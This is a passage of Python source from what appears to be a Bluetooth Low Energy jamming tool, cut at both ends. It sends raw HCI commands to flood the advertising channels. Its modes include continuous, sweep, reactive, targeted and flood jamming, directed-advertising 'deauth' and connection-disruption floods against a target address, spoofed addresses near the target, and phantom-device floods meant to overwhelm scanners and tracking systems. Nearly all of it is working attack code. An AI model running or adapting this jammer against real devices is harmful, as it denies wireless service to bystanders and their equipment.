            data_params += struct.pack('B', len(payload))
            data_params += payload
            cmds.append((0x08, 0x0037, data_params))
            sr_params = struct.pack('B', handle)
            sr_params += struct.pack('B', 0x03)
            sr_params += struct.pack('B', 0x01)
            sr_params += struct.pack('B', len(scan_rsp))
            sr_params += scan_rsp
            cmds.append((0x08, 0x0038, sr_params))
        return self._secondary_raw_socket.send_cmds(cmds)

    # ------------------------------------------------------------------
    # Pipelined legacy jam cycle (stop -> params -> data -> scan_rsp -> start)
    # ------------------------------------------------------------------

    def _pipelined_jam_cycle(self, channel_map: int = 0x07, adv_type: int = 0x03,
                             own_addr_type: int = 0x00, peer_addr: bytes = b'\x00' * 6,
                             peer_addr_type: int = 0x00):
        """Execute a complete jam cycle using HCI command pipelining.

        Sends stop_adv + set_params + set_data + set_scan_rsp + start_adv
        as a single burst instead of 5 sequential round-trips.
        Returns the payload length for byte estimation.
        """
        if not (self._use_raw and self._raw_socket):
            return 0

        payload = self._next_payload()
        scan_rsp = self._next_scan_rsp()

        # stop adv
        stop_params = struct.pack('B', 0x00)

        # set adv params
        adv_params = struct.pack('<HH', self._effective_interval,
                                 self._effective_interval)
        adv_params += struct.pack('B', adv_type)
        adv_params += struct.pack('B', own_addr_type)
        adv_params += struct.pack('B', peer_addr_type)
        adv_params += peer_addr[:6].ljust(6, b'\x00')
        adv_params += struct.pack('B', channel_map)
        adv_params += struct.pack('B', 0x00)

        # set adv data
        padded = payload[:31].ljust(31, b'\x00')
        data_params = struct.pack('B', len(padded)) + padded

        # set scan rsp data
        sr_padded = scan_rsp[:31].ljust(31, b'\x00')
        sr_params = struct.pack('B', len(sr_padded)) + sr_padded

        # start adv
        start_params = struct.pack('B', 0x01)

        cmds = [
            (0x08, 0x000A, stop_params),   # LE Set Advertise Enable (off)
            (0x08, 0x0006, adv_params),     # LE Set Advertising Parameters
            (0x08, 0x0008, data_params),    # LE Set Advertising Data
            (0x08, 0x0009, sr_params),      # LE Set Scan Response Data
            (0x08, 0x000A, start_params),   # LE Set Advertise Enable (on)
        ]
        self._raw_socket.send_cmds(cmds)
        return len(payload)

    # ==================================================================
    # PRIMARY JAM LOOPS
    # ==================================================================

    def _jam_loop_continuous(self, channel: int):
        """Continuous jamming on a single channel.

        Uses Extended Advertising with 4 simultaneous sets when available.
        Falls back to pipelined legacy advertising, then to sequential legacy.
        Scan response data is set on every cycle for double disruption.
        """
        session = self.sessions[-1] if self.sessions else None
        ch_map = self.CHANNEL_MAP.get(channel, 0x07)

        if self._use_ext_adv and self._raw_socket:
            # --- Extended Advertising path: 4 sets simultaneously ---
            self._setup_ext_adv_sets(channel_map=ch_map,
                                     count=self.EXT_ADV_SET_COUNT)
            self._enable_ext_adv_sets(enable=True,
                                      count=self.EXT_ADV_SET_COUNT)

            while not self._stop_event.is_set():
                n = self._rotate_ext_adv_sets(
                    count=self.EXT_ADV_SET_COUNT, channel=channel)
                if session:
                    for _ in range(self.EXT_ADV_SET_COUNT):
                        session.record_packet(channel=channel)
                time.sleep(0.0002)

            self._enable_ext_adv_sets(enable=False,
                                      count=self.EXT_ADV_SET_COUNT)

        elif self._use_raw and self._raw_socket:
            # --- Pipelined legacy path ---
            while not self._stop_event.is_set():
                self._pipelined_jam_cycle(channel_map=ch_map)
                if session:
                    session.record_packet(channel=channel)
                time.sleep(0.0003)
            self._stop_adv()

        else:
            # --- hcitool fallback ---
            self._set_adv_params(channel)
            self._set_adv_data(self._next_payload())
            self._set_scan_rsp_data(self._next_scan_rsp())
            self._start_adv()

            while not self._stop_event.is_set():
                self._stop_adv()
                self._set_adv_data(self._next_payload())
                self._set_scan_rsp_data(self._next_scan_rsp())
                self._start_adv()
                if session:
                    session.record_packet(channel=channel)
                time.sleep(0.001)
            self._stop_adv()

    def _jam_loop_sweep(self):
        """Sweep across BLE advertising channels in rapid succession.

        BLE devices listen on all 3 advertising channels (37, 38, 39) in
        sequence. By sweeping rapidly we maximize the chance of colliding
        with the target's advertising event on whichever channel it uses.

        In dual-adapter mode, primary covers ch37+ch38 while secondary
        holds ch39 continuously for true simultaneous coverage.
        """
        session = self.sessions[-1] if self.sessions else None
        channels = [37, 38] if self._dual_adapter else self.BLE_ADV_CHANNELS

        if self._use_ext_adv and self._raw_socket:
            # Assign one ext adv set per channel
            while not self._stop_event.is_set():
                for i, ch in enumerate(channels):
                    if self._stop_event.is_set():
                        break
                    ch_map = self.CHANNEL_MAP.get(ch, 0x07)
                    handle = i % self.EXT_ADV_SET_COUNT
                    self._raw_socket.le_set_ext_adv_params(
                        adv_handle=handle,
                        interval_min=self._effective_interval,
                        interval_max=self._effective_interval,
                        channel_map=ch_map,
                    )
                    self._raw_socket.le_set_ext_adv_data(
                        adv_handle=handle, data=self._next_payload())
                    self._raw_socket.le_set_ext_scan_rsp_data(
                        adv_handle=handle, data=self._next_scan_rsp())
                    self._raw_socket.le_set_ext_adv_enable(
                        enable=True, sets=[(handle, 0, 0)])
                    if session:
                        session.record_packet(channel=ch)
                    time.sleep(0.0003)
                    self._raw_socket.le_set_ext_adv_enable(
                        enable=False, sets=[(handle, 0, 0)])

        elif self._use_raw and self._raw_socket:
            while not self._stop_event.is_set():
                for channel in channels:
                    if self._stop_event.is_set():
                        break
                    ch_map = self.CHANNEL_MAP.get(channel, 0x07)
                    self._pipelined_jam_cycle(channel_map=ch_map)
                    if session:
                        session.record_packet(channel=channel)
                    time.sleep(0.0003)
            self._stop_adv()
        else:
            while not self._stop_event.is_set():
                for channel in channels:
                    if self._stop_event.is_set():
                        break
                    self._stop_adv()
                    self._set_adv_params(channel)
                    self._set_adv_data(self._next_payload())
                    self._set_scan_rsp_data(self._next_scan_rsp())
                    self._start_adv()
                    if session:
                        session.record_packet(channel=channel)
                    time.sleep(0.002)
            self._stop_adv()

    def _jam_loop_reactive(self, scanner_ref=None):
        """Reactive jamming with duty-cycle scan windows.

        Single-adapter: 80% jam / 20% quiet -- quiet window lets scanner
        see which devices are still present.
        Dual-adapter: primary jams 100% because secondary handles scanning.
        """
        session = self.sessions[-1] if self.sessions else None
        JAM_BURST = 0.2      # 200ms jam burst
        QUIET_WINDOW = 0.05  # 50ms quiet for scanning

        while not self._stop_event.is_set():
            burst_end = time.monotonic() + JAM_BURST
            while time.monotonic() < burst_end and not self._stop_event.is_set():
                for channel in self.BLE_ADV_CHANNELS:
                    if self._stop_event.is_set():
                        break

                    if self._use_ext_adv and self._raw_socket:
                        ch_map = self.CHANNEL_MAP.get(channel, 0x07)
                        self._raw_socket.le_set_ext_adv_params(
                            adv_handle=0, channel_map=ch_map,
                            interval_min=self._effective_interval,
                            interval_max=self._effective_interval,
                        )
                        self._raw_socket.le_set_ext_adv_data(
                            adv_handle=0, data=self._next_payload())
                        self._raw_socket.le_set_ext_scan_rsp_data(
                            adv_handle=0, data=self._next_scan_rsp())
                        self._raw_socket.le_set_ext_adv_enable(
                            enable=True, sets=[(0, 0, 0)])
                        if session:
                            session.record_packet(channel=channel)
                        time.sleep(0.0003)
                        self._raw_socket.le_set_ext_adv_enable(
                            enable=False, sets=[(0, 0, 0)])

                    elif self._use_raw and self._raw_socket:
                        ch_map = self.CHANNEL_MAP.get(channel, 0x07)
                        self._pipelined_jam_cycle(channel_map=ch_map)
                        if session:
                            session.record_packet(channel=channel)
                        time.sleep(0.0003)

                    else:
                        self._stop_adv()
                        self._set_adv_params(channel)
                        self._set_adv_data(self._next_payload())
                        self._set_scan_rsp_data(self._next_scan_rsp())
                        self._start_adv()
                        if session:
                            session.record_packet(channel=channel)
                        time.sleep(0.001)

            # Quiet window -- only in single-adapter mode
            if not self._dual_adapter:
                self._stop_adv()
                if self._use_ext_adv and self._raw_socket:
                    self._enable_ext_adv_sets(enable=False, count=1)
                time.sleep(QUIET_WINDOW)

        self._stop_adv()
        if self._use_ext_adv and self._raw_socket:
            self._enable_ext_adv_sets(enable=False, count=1)

    def _jam_loop_targeted(self, target: str):
        """Targeted jamming toward a specific device address.

        Sends crafted payloads that mimic the target's manufacturer data
        to cause maximum confusion in nearby BLE receivers. Uses random
        address spoofing when raw HCI is available.
        """
        session = self.sessions[-1] if self.sessions else None
        target_bytes = self._parse_target_address(target)

        while not self._stop_event.is_set():
            for channel in self.BLE_ADV_CHANNELS:
                if self._stop_event.is_set():
                    break

                # Spoof address near target
                if target_bytes and self._use_raw and self._raw_socket:
                    spoofed = bytearray(target_bytes)
                    r = os.urandom(2)
                    spoofed[-1] = (spoofed[-1] + (r[0] % 5) + 1) & 0xFF
                    spoofed[0] = spoofed[0] | 0xC0
                    self._raw_socket.le_set_random_address(bytes(spoofed))

                if self._use_ext_adv and self._raw_socket:
                    ch_map = self.CHANNEL_MAP.get(channel, 0x07)
                    self._raw_socket.le_set_ext_adv_params(
                        adv_handle=0, channel_map=ch_map,
                        interval_min=self._effective_interval,
                        interval_max=self._effective_interval,
                        own_addr_type=0x01,
                    )
                    self._raw_socket.le_set_ext_adv_data(
                        adv_handle=0, data=self._next_payload())
                    self._raw_socket.le_set_ext_scan_rsp_data(
                        adv_handle=0, data=self._next_scan_rsp())
                    self._raw_socket.le_set_ext_adv_enable(
                        enable=True, sets=[(0, 0, 0)])
                    if session:
                        session.record_packet(channel=channel)
                    time.sleep(0.0003)
                    self._raw_socket.le_set_ext_adv_enable(
                        enable=False, sets=[(0, 0, 0)])

                elif self._use_raw and self._raw_socket:
                    ch_map = self.CHANNEL_MAP.get(channel, 0x07)
                    self._pipelined_jam_cycle(
                        channel_map=ch_map, own_addr_type=0x01)
                    if session:
                        session.record_packet(channel=channel)
                    time.sleep(0.0003)

                else:
                    self._stop_adv()
                    self._set_adv_params(channel)
                    self._set_adv_data(self._next_payload())
                    self._set_scan_rsp_data(self._next_scan_rsp())
                    self._start_adv()
                    if session:
                        session.record_packet(channel=channel)
                    time.sleep(0.001)

        self._stop_adv()
        if self._use_ext_adv and self._raw_socket:
            self._enable_ext_adv_sets(enable=False, count=1)

    def _jam_loop_flood(self):
        """Maximum-rate advertising flood.

        Sends advertisements on all 3 channels simultaneously (channel map 0x07)
        at the minimum HCI interval, rotating payloads and random addresses
        every cycle. With Extended Advertising, runs 4 sets in parallel for
        4x the packet rate.
        """
        session = self.sessions[-1] if self.sessions else None
        ch_map = self.CHANNEL_MAP["all"]

        if self._use_ext_adv and self._raw_socket:
            # --- 4 simultaneous ext adv sets, all channels ---
            for handle in range(self.EXT_ADV_SET_COUNT):
                self._raw_socket.le_set_random_address(self._random_addr())
                self._raw_socket.le_set_ext_adv_params(
                    adv_handle=handle,
                    interval_min=self._effective_interval,
                    interval_max=self._effective_interval,
                    channel_map=ch_map,
                    own_addr_type=0x01,
                    adv_type=0x0010,
                )
                self._raw_socket.le_set_ext_adv_data(
                    adv_handle=handle, data=self._next_payload())
                self._raw_socket.le_set_ext_scan_rsp_data(
                    adv_handle=handle, data=self._next_scan_rsp())

            self._enable_ext_adv_sets(enable=True,
                                      count=self.EXT_ADV_SET_COUNT)

            while not self._stop_event.is_set():
                # Rotate random addresses to create phantom devices
                for handle in range(self.EXT_ADV_SET_COUNT):
                    self._raw_socket.le_set_random_address(self._random_addr())
                self._rotate_ext_adv_sets(count=self.EXT_ADV_SET_COUNT)
                if session:
                    for ch in self.BLE_ADV_CHANNELS:
                        session.record_packet(channel=ch)
                time.sleep(0.0002)

            self._enable_ext_adv_sets(enable=False,
                                      count=self.EXT_ADV_SET_COUNT)

        elif self._use_raw and self._raw_socket:
            self._raw_socket.le_set_adv_params(
                channel_map=ch_map,
                interval_min=self._effective_interval,
                interval_max=self._effective_interval,
                adv_type=0x03,
            )

            while not self._stop_event.is_set():
                self._raw_socket.le_set_random_address(self._random_addr())
                payload = self._next_payload()
                scan_rsp = self._next_scan_rsp()

                # Pipelined: stop -> data -> scan_rsp -> start
                stop_p = struct.pack('B', 0x00)
                padded = payload[:31].ljust(31, b'\x00')
                data_p = struct.pack('B', len(padded)) + padded
                sr_padded = scan_rsp[:31].ljust(31, b'\x00')
                sr_p = struct.pack('B', len(sr_padded)) + sr_padded
                start_p = struct.pack('B', 0x01)

                self._raw_socket.send_cmds([
                    (0x08, 0x000A, stop_p),
                    (0x08, 0x0008, data_p),
                    (0x08, 0x0009, sr_p),
                    (0x08, 0x000A, start_p),
                ])
                if session:
                    for ch in self.BLE_ADV_CHANNELS:
                        session.record_packet(channel=ch)
                time.sleep(0.0002)
            self._stop_adv()

        else:
            self._set_adv_params("all")
            while not self._stop_event.is_set():
                self._stop_adv()
                self._set_adv_data(self._next_payload())
                self._set_scan_rsp_data(self._next_scan_rsp())
                self._start_adv()
                if session:
                    for ch in self.BLE_ADV_CHANNELS:
                        session.record_packet(channel=ch)
                time.sleep(0.001)
            self._stop_adv()

    def _jam_loop_deauth(self, target: str = ""):
        """Connection disruption via rapid ADV_DIRECT_IND.

        Rapidly toggles advertising with ADV_DIRECT_IND type (0x01) to flood
        the target with connection requests, disrupting existing BLE
        connections and preventing new ones from forming.
        """
        session = self.sessions[-1] if self.sessions else None
        target_bytes = self._parse_target_address(target)
        if target_bytes is None:
            target_bytes = b'\xFF' * 6

        while not self._stop_event.is_set():
            for channel in self.BLE_ADV_CHANNELS:
                if self._stop_event.is_set():
                    break

                if self._use_raw and self._raw_socket:
                    rand_addr = self._random_addr()
                    self._raw_socket.le_set_random_address(rand_addr)

                    if self._use_ext_adv:
                        # Extended ADV_DIRECT_IND (legacy PDU type via ext)
                        self._raw_socket.le_set_ext_adv_params(
                            adv_handle=0,
                            interval_min=self._effective_interval,
                            interval_max=self._effective_interval,
                            channel_map=self.CHANNEL_MAP.get(channel, 0x07),
                            own_addr_type=0x01,
                            peer_addr_type=0x00,
                            peer_addr=target_bytes,
                            adv_type=0x0015,  # Legacy directed
                        )
                        self._raw_socket.le_set_ext_adv_data(
                            adv_handle=0, data=self._next_payload())
                        self._raw_socket.le_set_ext_adv_enable(
                            enable=True, sets=[(0, 0, 0)])
                        if session:
                            session.record_packet(channel=channel)
                        time.sleep(0.0003)
                        self._raw_socket.le_set_ext_adv_enable(
                            enable=False, sets=[(0, 0, 0)])
                    else:
                        # Legacy ADV_DIRECT_IND
                        ch_map = self.CHANNEL_MAP.get(channel, 0x07)
                        params = struct.pack('<HH', self._effective_interval,
                                             self._effective_interval)
                        params += struct.pack('B', 0x01)  # ADV_DIRECT_IND
                        params += struct.pack('B', 0x01)  # own = random
                        params += struct.pack('B', 0x00)  # peer = public
                        params += target_bytes
                        params += struct.pack('B', ch_map)
                        params += struct.pack('B', 0x00)
                        self._raw_socket.send_cmd(0x08, 0x0006, params)

                        self._set_adv_data(self._next_payload())
                        self._set_scan_rsp_data(self._next_scan_rsp())
                        self._start_adv()
                        if session:
                            session.record_packet(channel=channel)
                        time.sleep(0.0003)
                        self._stop_adv()
                else:
                    self._stop_adv()
                    self._set_adv_params(channel)
                    self._set_adv_data(self._next_payload())
                    self._set_scan_rsp_data(self._next_scan_rsp())
                    self._start_adv()
                    if session:
                        session.record_packet(channel=channel)
                    time.sleep(0.001)

        self._stop_adv()
        if self._use_ext_adv and self._raw_socket:
            self._enable_ext_adv_sets(enable=False, count=1)

    def _jam_loop_connection_disrupt(self, target: str = ""):
        """CONNECT_IND injection mode.

        Sends spoofed CONNECT_IND-style PDUs by rapidly cycling
        ADV_DIRECT_IND (type 0x01) with rotating initiator addresses.
        This forces the target's link layer to process and reject
        connection requests, consuming its radio time.

        Each cycle uses a new random source address to simulate
        multiple phantom connection attempts from different initiators.
        """
        session = self.sessions[-1] if self.sessions else None
        target_bytes = self._parse_target_address(target)
        if target_bytes is None:
            target_bytes = b'\xFF' * 6

        while not self._stop_event.is_set():
            for channel in self.BLE_ADV_CHANNELS:
                if self._stop_event.is_set():
                    break

                # New random initiator address each cycle
                rand_addr = self._random_addr()

                if self._use_raw and self._raw_socket:
                    self._raw_socket.le_set_random_address(rand_addr)

                    ch_map = self.CHANNEL_MAP.get(channel, 0x07)

                    if self._use_ext_adv:
                        self._raw_socket.le_set_ext_adv_params(
                            adv_handle=0,
                            interval_min=self._effective_interval,
                            interval_max=self._effective_interval,
                            channel_map=ch_map,
                            own_addr_type=0x01,
                            peer_addr_type=0x00,
                            peer_addr=target_bytes,
                            adv_type=0x0015,  # Legacy directed
                        )
                        self._raw_socket.le_set_ext_adv_enable(
                            enable=True, sets=[(0, 0, 0)])
                        if session:
                            session.record_packet(channel=channel)
                        time.sleep(0.0002)
                        self._raw_socket.le_set_ext_adv_enable(
                            enable=False, sets=[(0, 0, 0)])
                    else:
                        params = struct.pack('<HH', self._effective_interval,
                                             self._effective_interval)
                        params += struct.pack('B', 0x01)  # ADV_DIRECT_IND
                        params += struct.pack('B', 0x01)  # own = random
                        params += struct.pack('B', 0x00)  # peer = public
                        params += target_bytes
                        params += struct.pack('B', ch_map)
                        params += struct.pack('B', 0x00)

                        stop_p = struct.pack('B', 0x00)
                        start_p = struct.pack('B', 0x01)
                        self._raw_socket.send_cmds([
                            (0x08, 0x000A, stop_p),
                            (0x08, 0x0006, params),
                            (0x08, 0x000A, start_p),
                        ])
                        if session:
                            session.record_packet(channel=channel)
                        time.sleep(0.0002)
                else:
                    self._stop_adv()
                    self._set_adv_params(channel)
                    self._start_adv()
                    if session:
                        session.record_packet(channel=channel)
                    time.sleep(0.001)

        self._stop_adv()
        if self._use_ext_adv and self._raw_socket:
            self._enable_ext_adv_sets(enable=False, count=1)

    def _jam_loop_phantom_flood(self):
        """Phantom flood mode -- maximum phantom device generation.

        Each cycle sets a completely new random address, random device name,
        and random service UUIDs. This floods BLE scanners with hundreds
        of unique phantom devices per second, overwhelming monitoring
        and tracking systems.

        With Extended Advertising, runs 4 sets each with a unique phantom
        identity for 4x the phantom generation rate.
        """
        session = self.sessions[-1] if self.sessions else None
        ch_map = self.CHANNEL_MAP["all"]

        def _build_phantom_payload() -> bytes:
            """Build a payload with random name + random service UUID."""
            payload = bytearray()
            # Flags
            payload += b'\x02\x01\x06'
            # Random short local name (type 0x08), 8 chars
            name = os.urandom(8)
            payload += bytes([len(name) + 1, 0x08]) + name
            # Random 16-bit service UUID (type 0x03)
            svc_uuid = os.urandom(2)
            payload += bytes([len(svc_uuid) + 1, 0x03]) + svc_uuid
            # Random manufacturer data to fill remaining space
            remaining = 31 - len(payload)
            if remaining > 2:
                mfr = os.urandom(remaining - 2)
                payload += bytes([len(mfr) + 1, 0xFF]) + mfr
            return bytes(payload[:31])

        if self._use_ext_adv and self._raw_socket:
            # Initialize 4 phantom identities
            for handle in range(self.EXT_ADV_SET_COUNT):
                self._raw_socket.le_set_ext_adv_params(
                    adv_handle=handle,
                    interval_min=self._effective_interval,
                    interval_max=self._effective_interval,
                    channel_map=ch_map,
                    own_addr_type=0x01,
                    adv_type=0x0012,  # Legacy scannable undirected
                )

            self._enable_ext_adv_sets(enable=True,
                                      count=self.EXT_ADV_SET_COUNT)

            while not self._stop_event.is_set():
                cmds = []
                for handle in range(self.EXT_ADV_SET_COUNT):
                    # New random address per handle
                    self._raw_socket.le_set_random_address(self._random_addr())

                    phantom = _build_phantom_payload()
                    data_params = struct.pack('B', handle)
                    data_params += struct.pack('B', 0x03)
                    data_params += struct.pack('B', 0x01)
                    data_params += struct.pack('B', len(phantom))
                    data_params += phantom
                    cmds.append((0x08, 0x0037, data_params))

                    # Scan response with different name
                    sr_phantom = _build_phantom_payload()
                    sr_params = struct.pack('B', handle)
                    sr_params += struct.pack('B', 0x03)
                    sr_params += struct.pack('B', 0x01)
                    sr_params += struct.pack('B', len(sr_phantom))
                    sr_params += sr_phantom
                    cmds.append((0x08, 0x0038, sr_params))

                self._raw_socket.send_cmds(cmds)
                if session:
                    for ch in self.BLE_ADV_CHANNELS:
                        session.record_packet(channel=ch)
                time.sleep(0.0002)

            self._enable_ext_adv_sets(enable=False,
                                      count=self.EXT_ADV_SET_COUNT)

        elif self._use_raw and self._raw_socket:
            self._raw_socket.le_set_adv_params(
                channel_map=ch_map,
                interval_min=self._effective_interval,
                interval_max=self._effective_interval,
                adv_type=0x02,  # ADV_SCAN_IND (scannable)
            )

            while not self._stop_event.is_set():
                self._raw_socket.le_set_random_address(self._random_addr())
                phantom = _build_phantom_payload()
                sr_phantom = _build_phantom_payload()

                padded = phantom[:31].ljust(31, b'\x00')
                sr_padded = sr_phantom[:31].ljust(31, b'\x00')

                stop_p = struct.pack('B', 0x00)
                data_p = struct.pack('B', len(padded)) + padded
                sr_p = struct.pack('B', len(sr_padded)) + sr_padded
                start_p = struct.pack('B', 0x01)

                self._raw_socket.send_cmds([
                    (0x08, 0x000A, stop_p),
                    (0x08, 0x0008, data_p),
                    (0x08, 0x0009, sr_p),
                    (0x08, 0x000A, start_p),
                ])
                if session:
                    for ch in self.BLE_ADV_CHANNELS:
                        session.record_packet(channel=ch)
                time.sleep(0.0003)
            self._stop_adv()

        else:
            while not self._stop_event.is_set():
                self._stop_adv()
                self._set_adv_params("all")
                self._set_adv_data(_build_phantom_payload())
                self._set_scan_rsp_data(_build_phantom_payload())
                self._start_adv()
                if session:
                    for ch in self.BLE_ADV_CHANNELS:
                        session.record_packet(channel=ch)
                time.sleep(0.001)
            self._stop_adv()

    # ==================================================================
    # SECONDARY ADAPTER JAM LOOPS
    # ==================================================================

    def _secondary_jam_loop_continuous(self, channel: int):
        """Secondary adapter: jam a different channel than primary."""
        session = self.sessions[-1] if self.sessions else None
        ch_map = self.CHANNEL_MAP.get(channel, 0x07)

        if self._secondary_use_ext_adv and self._secondary_raw_socket:
            self._secondary_setup_ext_adv_sets(
                channel_map=ch_map, count=self.EXT_ADV_SET_COUNT)
            self._secondary_enable_ext_adv_sets(
                enable=True, count=self.EXT_ADV_SET_COUNT)

            while not self._stop_event.is_set():
                self._secondary_rotate_ext_adv_sets(
                    count=self.EXT_ADV_SET_COUNT)
                if session:
                    for _ in range(self.EXT_ADV_SET_COUNT):
                        session.record_packet(channel=channel)
                time.sleep(0.0002)

            self._secondary_enable_ext_adv_sets(
                enable=False, count=self.EXT_ADV_SET_COUNT)
        else:
            self._secondary_set_adv_params(channel)
            self._secondary_set_adv_data(self._next_payload())
            self._secondary_set_scan_rsp_data(self._next_scan_rsp())
            self._secondary_start_adv()

            while not self._stop_event.is_set():
                self._secondary_stop_adv()
                self._secondary_set_adv_data(self._next_payload())
                self._secondary_set_scan_rsp_data(self._next_scan_rsp())
                self._secondary_start_adv()
                if session:
                    session.record_packet(channel=channel)
                time.sleep(0.0003 if self._secondary_use_raw else 0.001)

            self._secondary_stop_adv()

    def _secondary_jam_loop_sweep(self, channel: int):
        """Secondary adapter: hold a single channel while primary covers others."""
        session = self.sessions[-1] if self.sessions else None

        if self._secondary_use_ext_adv and self._secondary_raw_socket:
            ch_map = self.CHANNEL_MAP.get(channel, 0x07)
            self._secondary_setup_ext_adv_sets(
                channel_map=ch_map, count=self.EXT_ADV_SET_COUNT)
            self._secondary_enable_ext_adv_sets(
                enable=True, count=self.EXT_ADV_SET_COUNT)

            while not self._stop_event.is_set():
                self._secondary_rotate_ext_adv_sets(
                    count=self.EXT_ADV_SET_COUNT)
                if session:
                    for _ in range(self.EXT_ADV_SET_COUNT):
                        session.record_packet(channel=channel)
                time.sleep(0.0003)

            self._secondary_enable_ext_adv_sets(
                enable=False, count=self.EXT_ADV_SET_COUNT)
        else:
            self._secondary_set_adv_params(channel)
            while not self._stop_event.is_set():
                self._secondary_stop_adv()
                self._secondary_set_adv_data(self._next_payload())
                self._secondary_set_scan_rsp_data(self._next_scan_rsp())
                self._secondary_start_adv()
                if session:
                    session.record_packet(channel=channel)
                time.sleep(0.0008 if self._secondary_use_raw else 0.002)
            self._secondary_stop_adv()

    def _secondary_jam_loop_flood(self):
        """Secondary adapter: flood all channels with different payloads."""
        session = self.sessions[-1] if self.sessions else None
        ch_map = self.CHANNEL_MAP["all"]

        if self._secondary_use_ext_adv and self._secondary_raw_socket:
            for handle in range(self.EXT_ADV_SET_COUNT):
                self._secondary_raw_socket.le_set_ext_adv_params(
                    adv_handle=handle,
                    interval_min=self._effective_interval,
                    interval_max=self._effective_interval,
                    channel_map=ch_map,
                    own_addr_type=0x01,
                )
                self._secondary_raw_socket.le_set_ext_adv_data(
                    adv_handle=handle, data=self._next_payload())
                self._secondary_raw_socket.le_set_ext_scan_rsp_data(
                    adv_handle=handle, data=self._next_scan_rsp())

            self._secondary_enable_ext_adv_sets(
                enable=True, count=self.EXT_ADV_SET_COUNT)

            while not self._stop_event.is_set():
                for handle in range(self.EXT_ADV_SET_COUNT):
                    self._secondary_raw_socket.le_set_random_address(
                        self._random_addr())
                self._secondary_rotate_ext_adv_sets(
                    count=self.EXT_ADV_SET_COUNT)
                if session:
                    for ch in self.BLE_ADV_CHANNELS:
                        session.record_packet(channel=ch)
                time.sleep(0.0002)

            self._secondary_enable_ext_adv_sets(
                enable=False, count=self.EXT_ADV_SET_COUNT)
        else:
            if self._secondary_use_raw and self._secondary_raw_socket:
                self._secondary_raw_socket.le_set_adv_params(
                    channel_map=ch_map,
                    interval_min=self._effective_interval,
                    interval_max=self._effective_interval,
                    adv_type=0x03,
                )
            else:
                self._secondary_set_adv_params("all")

            while not self._stop_event.is_set():
                if self._secondary_use_raw and self._secondary_raw_socket:
                    self._secondary_raw_socket.le_set_random_address(
                        self._random_addr())
                self._secondary_stop_adv()
                self._secondary_set_adv_data(self._next_payload())
                self._secondary_set_scan_rsp_data(self._next_scan_rsp())
                self._secondary_start_adv()
                if session:
                    for ch in self.BLE_ADV_CHANNELS:
                        session.record_packet(channel=ch)
                time.sleep(0.0002 if self._secondary_use_raw else 0.001)
            self._secondary_stop_adv()

    def _secondary_jam_loop_targeted(self, target: str):
        """Secondary adapter: target the same device from a different address."""
        session = self.sessions[-1] if self.sessions else None
        target_bytes = self._parse_target_address(target)

        while not self._stop_event.is_set():
            for channel in self.BLE_ADV_CHANNELS:
                if self._stop_event.is_set():
                    break
                self._secondary_stop_adv()

                if target_bytes and self._secondary_use_raw and self._secondary_raw_socket:
                    spoofed = bytearray(target_bytes)
                    r = os.urandom(2)
                    spoofed[-1] = (spoofed[-1] + (r[0] % 5) + 6) & 0xFF
                    spoofed[0] = spoofed[0] | 0xC0
                    self._secondary_raw_socket.le_set_random_address(bytes(spoofed))

                self._secondary_set_adv_params(channel)
                self._secondary_set_adv_data(self._next_payload())
                self._secondary_set_scan_rsp_data(self._next_scan_rsp())
                self._secondary_start_adv()
                if session:
                    session.record_packet(channel=channel)
                time.sleep(0.0003 if self._secondary_use_raw else 0.001)

        self._secondary_stop_adv()

    def _secondary_jam_loop_deauth(self, target: str = ""):
        """Secondary adapter: deauth the same target from a different address."""
        session = self.sessions[-1] if self.sessions else None
        target_bytes = self._parse_target_address(target)
        if target_bytes is None:
            target_bytes = b'\xFF' * 6

        while not self._stop_event.is_set():
            for channel in self.BLE_ADV_CHANNELS:
                if self._stop_event.is_set():
                    break
                self._secondary_stop_adv()

                if self._secondary_use_raw and self._secondary_raw_socket:
                    ch_map = self.CHANNEL_MAP.get(channel, 0x07)
                    params = struct.pack('<HH', self._effective_interval,
                                         self._effective_interval)
                    params += struct.pack('B', 0x01)  # ADV_DIRECT_IND
                    params += struct.pack('B', 0x01)  # own = random
                    params += struct.pack('B', 0x00)  # peer = public
                    params += target_bytes
                    params += struct.pack('B', ch_map)
                    params += struct.pack('B', 0x00)
                    self._secondary_raw_socket.send_cmd(0x08, 0x0006, params)

                    self._secondary_raw_socket.le_set_random_address(
                        self._random_addr())
                else:
                    self._secondary_set_adv_params(channel)

                self._secondary_set_adv_data(self._next_payload())
                self._secondary_set_scan_rsp_data(self._next_scan_rsp())
                self._secondary_start_adv()
                if session:
                    session.record_packet(channel=channel)
                time.sleep(0.0003 if self._secondary_use_raw else 0.001)

        self._secondary_stop_adv()

    def _secondary_jam_loop_connection_disrupt(self, target: str = ""):
        """Secondary adapter: connection_disrupt from different addresses."""
        session = self.sessions[-1] if self.sessions else None
        target_bytes = self._parse_target_address(target)
        if target_bytes is None:
            target_bytes = b'\xFF' * 6

        while not self._stop_event.is_set():
            for channel in self.BLE_ADV_CHANNELS:
                if self._stop_event.is_set():
                    break

                if self._secondary_use_raw and self._secondary_raw_socket:
                    self._secondary_raw_socket.le_set_random_address(
                        self._random_addr())
                    ch_map = self.CHANNEL_MAP.get(channel, 0x07)
                    params = struct.pack('<HH', self._effective_interval,
                                         self._effective_interval)
                    params += struct.pack('B', 0x01)
                    params += struct.pack('B', 0x01)
                    params += struct.pack('B', 0x00)
                    params += target_bytes
                    params += struct.pack('B', ch_map)
                    params += struct.pack('B', 0x00)

                    stop_p = struct.pack('B', 0x00)
                    start_p = struct.pack('B', 0x01)
                    self._secondary_raw_socket.send_cmds([
                        (0x08, 0x000A, stop_p),
                        (0x08, 0x0006, params),
                        (0x08, 0x000A, start_p),
                    ])
                else:
                    self._secondary_stop_adv()
                    self._secondary_set_adv_params(channel)
                    self._secondary_start_adv()

                if session:
                    session.record_packet(channel=channel)
                time.sleep(0.0002 if self._secondary_use_raw else 0.001)

        self._secondary_stop_adv()

    def _secondary_jam_loop_phantom_flood(self):
        """Secondary adapter: phantom flood with different identities."""
        session = self.sessions[-1] if self.sessions else None
        ch_map = self.CHANNEL_MAP["all"]

        def _build_phantom():
            payload = bytearray(b'\x02\x01\x06')
            name = os.urandom(8)
            payload += bytes([len(name) + 1, 0x08]) + name
            svc_uuid = os.urandom(2)
            payload += bytes([len(svc_uuid) + 1, 0x03]) + svc_uuid
            remaining = 31 - len(payload)
            if remaining > 2:
                mfr = os.urandom(remaining - 2)
                payload += bytes([len(mfr) + 1, 0xFF]) + mfr
            return bytes(payload[:31])

        if self._secondary_use_raw and self._secondary_raw_socket:
            self._secondary_raw_socket.le_set_adv_params(
                channel_map=ch_map,
                interval_min=self._effective_interval,
